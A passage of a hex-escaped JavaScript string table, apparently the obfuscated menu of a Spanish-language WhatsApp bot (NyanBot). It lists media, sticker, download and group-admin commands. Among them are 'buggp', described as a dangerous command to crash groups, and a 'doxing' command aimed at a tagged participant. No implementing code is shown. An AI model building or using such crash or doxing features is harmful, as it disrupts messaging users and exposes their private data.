\x61\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x74\x72\x69\x67\x67\x65\x72\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x6C\x65\x6E\x74\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x72\x61\x70\x69\x64\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x69\x6D\x75\x74\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x68\x6F\x64\x65\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x67\x72\x61\x76\x65\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x66\x61\x6E\x74\x61\x73\x6D\x61\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x72\x6F\x62\x6F\x74\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u255F\u257C\u257E\u2524\uD83C\uDF9E\x56\x49\x44\x45\x4F\x53\uD83C\uDF9E\u251C\u257C\u257E\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x72\x65\x76\x65\x72\x73\x61\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x76\x69\x64\x65\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x76\x72\x61\x70\x69\x64\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x76\x69\x64\x65\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x76\x6C\x65\x6E\x74\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x76\x69\x64\x65\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x6D\x69\x72\x72\x6F\x72\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x76\x69\x64\x65\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x76\x65\x66\x65\x63\x74\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x76\x69\x64\x65\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x73\x69\x6E\x73\x6F\x6E\x69\x64\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x76\x69\x64\x65\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2559\u2556\x0D\x0A\x09\x09\x09\x09\x09\u2552\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u256E\x0D\x0A\x09\x09\x09\x09\x09\u2502\u103C\uD835\uDE9C\u1DE4\uD835\uDE8A\u0363\uD835\uDE96\u036B\uD835\uDE9E\uD834\uDE44\uD81B\uDF94\uD81B\uDF94\uD81B\uDF59\uD83D\uDE08\x2E\x6C\x69\x20\x4F\u2131\u1ECB\x63\u03B9\u0251\x6C\x2E\x6C\x69\uD83C\uDF34\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F","\x74\x65\x78\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","\uD83E\uDDF8\uD835\uDE48\uD835\uDE40\uD835\uDE49\uD835\uDE50\u2061\u205F\uD835\uDE3F\uD835\uDE40\x20\uD835\uDE48\uD835\uDE40\uD835\uDE3F\uD835\uDE44\uD835\uDE3C\uD83D\uDCCC","\x73\x74\x69\x63\x6B\x65\x72","\u256D\u2E3B\u20DE\u272B\uABED\uD835\uDE48\uABED\uD835\uDE40\uABED\uD835\uDE49\uABED\uD835\uDE50\uABED\u272B\u20DE\u2E3B\u256E\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u103C\uD835\uDC12\uD835\uDC2D\uD835\uDC22\uD835\uDC1C\uD835\uDC24\uD835\uDC1E\uD835\uDC2B\uD83C\uDCCF\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x73\x74\x69\x63\x6B\x65\x72\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x49\x6D\x61\x67\x65\x6E\x2F\x67\x69\x66\x2F\x76\x69\x64\x65\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x50\x61\x72\x61\x20\x63\x72\x65\x61\x72\x20\x73\x74\x69\x63\x6B\x65\x72\x20\x63\x6F\x6E\x20\x76\x69\x64\x65\x6F\x2C\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x65\x69\x71\x75\x65\x74\x61\x20\x65\x6C\x20\x76\x69\x64\x65\x6F\x2F\x67\x69\x66\x20\x61\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x63\x6F\x6E\x76\x65\x72\x74\x69\x72\x20\x63\x6F\x6E\x20\x65\x6C\x20\x63\x6F\x6D\x61\x6E\x64\x6F\x2E\x20\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x73\x70\x61\x63\x6B\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x50\x61\x71\x75\x65\x74\x65\x20\x70\x65\x72\x73\x6F\x6E\x61\x6C\x69\x7A\x61\x64\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x45\x78\x3A\x20\x2A","\x73\x70\x61\x63\x6B\x2A\x20\x53\x61\x6D\x75\x7C\x33\x33\x30\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x72\x6F\x62\x61\x72\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x65\x78\x69\x66\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x74\x61\x6B\x65\x73\x74\x69\x63\x6B\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x4E\x6F\x6D\x62\x72\x65\x7C\x41\x75\x74\x6F\x72\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x73\x67\x61\x79\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x61\x20\x69\x6D\x61\x67\x65\x6E\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x73\x72\x69\x70\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x61\x20\x69\x6D\x61\x67\x65\x6E\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x73\x63\x61\x72\x63\x65\x6C\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x61\x20\x69\x6D\x61\x67\x65\x6E\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x73\x77\x6D\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x4E\x6F\x6D\x62\x72\x65\x7C\x41\x75\x74\x6F\x72\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x63\x6F\x6C\x6F\x72\x65\x73\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x54\x65\x78\x74\x6F\x20\x61\x20\x63\x6F\x6C\x6F\x72\x65\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x67\x65\x72\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x45\x73\x74\x69\x6C\x6F\x20\x54\x72\x69\x67\x67\x65\x72\x65\x64\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x61\x69\x6D\x67\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x53\x74\x69\x6B\x65\x72\x20\x61\x20\x69\x6D\x61\x67\x65\x6E\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x2A","\x61\x67\x69\x66\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2502\x20\x5F\x53\x74\x69\x6B\x65\x72\x20\x61\x20\x67\x69\x66\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256E\x0D\x0A\x09\x09\x09\x09\x09\u256D\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u256E\x0D\x0A\x09\x09\x09\x09\x09\u2502\u103C\uD835\uDE9C\u1DE4\uD835\uDE8A\u0363\uD835\uDE96\u036B\uD835\uDE9E\uD834\uDE44\uD81B\uDF94\uD81B\uDF94\uD81B\uDF59\uD83D\uDE08\x2E\x6C\x69\x20\x4F\u2131\u1ECB\x63\u03B9\u0251\x6C\x2E\x6C\x69\x20\x0D\x0A\x09\x09\x09\x09\x09\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256F","\uD83D\uDCDA\uD835\uDC46\uD835\uDC61\uD835\uDC56\uD835\uDC58\uD835\uDC52\uD835\uDC5F\x20\uD835\uDC5A\uD835\uDC52\uD835\uDC5B\uD835\uDC62","\x67\x72\x75\x70\x6F\x73","\x63\x6F\x6D\x70\x6F\x73\x69\x6E\x67","\x75\x70\x64\x61\x74\x65\x50\x72\x65\x73\x65\x6E\x63\x65","\x75\x73\x72\x52\x65\x67","\x6F\x6E\x6C\x79","\x75\x70\x74\x69\x6D\x65","\u27AB\u103C\uD835\uDE9C\u1DE4\uD835\uDE8A\u0363\uD835\uDE96\u036B\uD835\uDE9E\uD834\uDE44\uD81B\uDF94\uD81B\uDF94\uD81B\uDF59\x2E\x6C\x69\x20\x4F\u2131\u1ECB\x63\u03B9\u0251\x6C\x2E\x6C\x69\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0D\x0A\x09\x09\x09\x09\x09\uD83D\uDD10\x48\x6F\x6C\x61\x20\x2A","\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x20","","\x61\x6E\x74\x69\x6C\x69\x6E\x6B","\x0D\x0A\x09\x09\x09\x09\x09","\x61\x6E\x74\x69\x6D\x65\x64\x69\x61","\x61\x6E\x74\x69\x62\x61\x64","\x61\x75\x74\x6F\x73\x74\x69\x63\x6B","\x61\x6E\x74\x69\x6C\x65\x67","\x61\x6E\x74\x69\x67\x70","\x0D\x0A\x09\x09\x09\x09\x09\x5F\x50\x61\x72\x61\x20\x70\x72\x6F\x68\x69\x62\x69\x72\x20\x6C\x6F\x73\x20\x6C\x69\x6E\x6B\x73\x20\x64\x65\x20\x6F\x74\x72\x6F\x73\x20\x67\x72\x75\x70\x6F\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x0D\x0A\x09\x09\x09\x09\x09\x2A\uD83D\uDD1E\x50\x41\x52\x41\x20\x41\x43\x54\x49\x56\x41\x52\x20\x4C\x4F\x53\x20\x43\x4F\x4D\x41\x4E\x44\x4F\x53\x20\x2B\x31\x38\x2A\x3A\x0D\x0A\x09\x09\x09\x09\x09\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x0D\x0A\x09\x09\x09\x09\x09","\x2B\x31\x38\x20\x31\x2F\x30\x0D\x0A\x09\x09\x09\x09\x09\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x0D\x0A\x09\x09\x09\x09\x09\x09\x5F\x4D\x6F\x64\x6F\x20\x73\x69\x6D\x73\x69\x6D\x69\x20\x69\x6C\x69\x6D\x69\x74\x61\x64\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\x2A","\x73\x69\x6D\x73\x69\x6D\x69\x20\x31\x2A\x0D\x0A\x09\x09\x09\x09\x09\x2A\x50\x61\x72\x61\x20\x71\x75\x65\x20\x65\x6C\x20\x62\x6F\x74\x20\x65\x6E\x74\x72\x65\x20\x61\x20\x74\x75\x20\x67\x72\x75\x70\x6F\x2C\x20\x75\x73\x61\x20\x65\x6C\x20\x73\x69\x67\x75\x69\x65\x6E\x74\x65\x20\x63\x6F\x6D\x61\x6E\x64\x6F\x3A\x2A\x0D\x0A\x09\x09\x09\x09\x09\x09","\x65\x6E\x74\x72\x61\x62\x6F\x74\x20\x2A\x28\x4C\x69\x6E\x6B\x20\x64\x65\x6C\x20\x67\x72\x75\x70\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09\x09\x0D\x0A\x09\x09\x09\x09\x09\uD83D\uDEA7\x20\x2A\x45\x6C\x20\x73\x69\x67\x75\x69\x65\x6E\x74\x65\x20\x63\x6F\x6D\x61\x6E\x64\x6F\x20\x65\x73\x20\x70\x61\x72\x61\x20\x63\x72\x61\x73\x68\x65\x61\x72\x20\x6C\x6F\x73\x20\x67\x72\x75\x70\x6F\x73\x21\x21\x20\x65\x73\x74\x65\x20\x63\x6F\x6D\x61\x6E\x64\x6F\x20\x65\x73\x20\x6D\x75\x79\x20\x70\x65\x6C\x69\x67\x72\x6F\x73\x6F\x20\x3A\x29\x20\x73\x6F\x6C\x6F\x20\x61\x64\x6D\x69\x6E\x69\x73\x74\x72\x61\x64\x6F\x72\x65\x73\x20\x70\x75\x65\x64\x65\x6E\x20\x75\x73\x61\x72\x6C\x6F\x2E\x2A\x20\uD83D\uDEA7\x0D\x0A\x09\x09\x09\x09\x09\x2A","\x62\x75\x67\x67\x70\x2A\x0D\x0A\x09\x09\x09\x09\x09\x5F\x55\x73\x61\x6C\x6F\x20\x62\x61\x6A\x6F\x20\x74\x75\x20\x72\x65\x73\x70\x6F\x6E\x73\x61\x62\x69\x6C\x69\x64\x61\x64\x21\x5F\x0D\x0A\x09\x09\x09\x09\x09","\x64\x6F\x78\x69\x6E\x67\x20\x5F\x28\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6E\x74\x65\x20\x6F\x20\x61\x6C\x67\x75\x6E\x20\x6D\x65\x6E\x73\x61\x6A\x65\x29\x5F\x0D\x0A\x09\x09\x09\x09\x09","\x69\x6E\x73\x70\x65\x63\x63\x69\x6F\x6E\x61\x72\x20\x5F\x28\x52\x65\x71\x75\x69\x65\x72\x65\x20\x6C\x69\x6E\x6B\x20\x64\x65\x20\x75\x6E\x20\x67\x72\x75\x70\x6F\x29\x5F\x0D\x0A\x09\x09\x09\x09\x09","\x6E\x75\x65\x76\x6F\x67\x72\x75\x70\x6F\x0D\x0A\x09\x09\x09\x09\x09","\x67\x72\x75\x70\x6F\x20\x61\x62\x72\x69\x72\x2F\x63\x65\x72\x72\x61\x72\x0D\x0A\x09\x09\x09\x09\x09","\x67\x65\x74\x70\x69\x63\x0D\x0A\x09\x09\x09\x09\x09","\x73\x61\x6C\x69\x72\x0D\x0A\x09\x09\x09\x09\x09","\x74\x61\x67\x73\x74\x69\x63\x6B\x0D\x0A\x09\x09\x09\x09\x09","\x69\x6D\x61\x67\x65\x74\x61\x67\x0D\x0A\x09\x09\x09\x09\x09","\x68\x69\x64\x65\x74\x61\x67\x0D\x0A\x09\x09\x09\x09\x09","\x74\x6F\x64\x6F\x73\x0D\x0A\x09\x09\x09\x09\x09","\x73\x65\x74\x64\x65\x73\x63\x0D\x0A\x09\x09\x09\x09\x09","\x6E\x6F\x6D\x62\x72\x65\x0D\x0A\x09\x09\x09\x09\x09","\x61\x64\x6D\x69\x6E\x6C\x69\x73\x74\x0D\x0A\x09\x09\x09\x09\x09","\x73\x65\x74\x70\x69\x63\x0D\x0A\x09\x09\x09\x09\x09","\x65\x6E\x6C\x69\x6E\x65\x61\x0D\x0A\x09\x09\x09\x09\x09","\x70\x72\x6F\x6D\x6F\x74\x65\x0D\x0A\x09\x09\x09\x09\x09","\x64\x65\x6D\x6F\x74\x65\x0D\x0A\x09\x09\x09\x09\x09","\x65\x6C\x69\x6D\x69\x6E\x61\x72\x0D\x0A\x09\x09\x09\x09\x09","\x61\xF1\x61\x64\x69\x72\x20\x2A\x28\x4E\x75\x6D\x65\x72\x6F\x20\x73\x69\x6E\x20\x65\x6C\x20\x2B\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x6E\x6F\x74\x69\x66\x0D\x0A\x09\x09\x09\x09\x09","\x72\x65\x70\x6C\x79\x20\x40\x6D\x69\x65\x6D\x62\x72\x6F\x7C\x66\x72\x61\x73\x65\x7C\x66\x72\x61\x73\x65\x0D\x0A\x09\x09\x09\x09\x09","\x63\x6F\x6E\x74\x61\x63\x74\x6F\x20\x40\x6D\x69\x65\x6D\x62\x72\x6F\x7C\x6E\x6F\x6D\x62\x72\x65\x0D\x0A\x09\x09\x09\x09\x09","\x6C\x69\x6E\x6B\x0D\x0A\x09\x09\x09\x09\x09","\x74\x6F\x70\x35\x0D\x0A\x09\x09\x09\x09\x09","\x63\x6C\x6F\x6E\x61\x72\x0D\x0A\x09\x09\x09\x09\x09","\x69\x6D\x61\x67\x65\x2F\x6A\x70\x65\x67","\u27AB\uD835\uDC74\uD835\uDC86\uD835\uDC8F\uD835\uDC96\x20\uD835\uDC6B\uD835\uDC86\x20\uD835\uDC6E\uD835\uDC93\uD835\uDC96\uD835\uDC91\uD835\uDC90\uD835\uDC94\x0A\u2763\uFE0F\u20DE\uD83D\uDD25\uD835\uDE4E\uABED\uD835\uDE56\u0360\uD835\uDE62\uABED\x20\uD835\uDE54\x20\uABED\uD835\uDE4B\uABED\uD835\uDE5A\uD835\uDE67\uD835\uDE67\uABED\uD835\uDE6E\uD83D\uDD25\u2763\uFE0F","\x2E\x2F\x4E\x79\x61\x6E\x42\x6F\x74\x2E\x6A\x70\x67","\x64\x65\x73\x63\x61\x72\x67\x61\x73","\u27AB\u103C\uD835\uDE9C\u1DE4\uD835\uDE8A\u0363\uD835\uDE96\u036B\uD835\uDE9E\uD834\uDE44\uD81B\uDF94\uD81B\uDF94\uD81B\uDF59\x2E\x6C\x69\x20\x4F\u2131\u1ECB\x63\u03B9\u0251\x6C\x2E\x6C\x69\x20\x20\x20\x0D\x0A\x09\x09\x09\x09\x09\uD83D\uDD10\x48\x6F\x6C\x61\x20\x2A","\x2A\x0D\x0A\x09\x09\x09\x09\x09\u266B\u266A\x2E\u0131\x6C\u0131\x6C\u0131\x6C\x6C\x7C\u0305\u0332\u0305\u25CF\u0305\u0332\u0305\x7C\u0305\u0332\u0305\x3D\u0305\u0332\u0305\x7C\u0305\u0332\u0305\u25CF\u0305\u0332\u0305\x7C\x6C\x6C\u0131\x6C\u0131\x6C\u0131\x2E\u266B\u266A\x0D\x0A\x09\x09\x09\x09\x09","\x70\x6C\x61\x79\x20\x2A\x28\x44\x65\x73\x63\x61\x72\x67\x61\x20\x64\x65\x20\x6D\x75\x73\x69\x63\x61\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x70\x6C\x61\x79\x76\x69\x64\x20\x2A\x28\x44\x65\x73\x63\x61\x72\x67\x61\x20\x64\x65\x20\x76\x69\x64\x65\x6F\x73\x20\x70\x6F\x72\x20\x6E\x6F\x6D\x62\x72\x65\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x69\x67\x20\x2A\x28\x46\x6F\x74\x6F\x73\x20\x79\x20\x76\x69\x64\x65\x6F\x73\x20\x64\x65\x20\x49\x6E\x73\x74\x61\x67\x72\x61\x6D\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x74\x77\x69\x74\x20\x2A\x28\x76\x69\x64\x65\x6F\x73\x20\x64\x65\x20\x54\x77\x69\x74\x74\x65\x72\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x79\x74\x6D\x70\x33\x20\x2A\x28\x44\x65\x73\x63\x61\x72\x67\x61\x20\x64\x65\x20\x6D\x75\x73\x69\x63\x61\x20\x70\x6F\x72\x20\x6C\x69\x6E\x6B\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x79\x74\x6D\x70\x34\x20\x2A\x28\x44\x65\x73\x63\x61\x72\x67\x61\x20\x64\x65\x20\x76\x69\x64\x65\x6F\x73\x20\x70\x6F\x72\x20\x6C\x69\x6E\x6B\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x66\x62\x20\x5F\x28\x4C\x69\x6E\x6B\x20\x64\x65\x20\x46\x61\x63\x65\x42\x6F\x6F\x6B\x29\x5F\x0D\x0A\x09\x09\x09\x09\x09","\x6D\x66\x69\x72\x65\x20\x2A\x28\x4C\x69\x6E\x6B\x20\x64\x65\x20\x6D\x65\x64\x69\x61\x66\x69\x72\x65\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x74\x6F\x6D\x70\x33\x20\x2A\x28\x56\x69\x64\x65\x6F\x73\x20\x61\x20\x61\x75\x64\x69\x6F\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x6C\x65\x74\x72\x61\x20\x2A\x28\x42\x75\x73\x63\x61\x20\x6C\x61\x20\x6C\x65\x74\x72\x61\x20\x64\x65\x20\x75\x6E\x61\x20\x63\x61\x6E\x63\x69\x6F\x6E\x29\x2A\x0D\x0A\x09\x09\x09\x09\x09","\x74\x6F\x6F\x6C\x73","\u27AB\u103C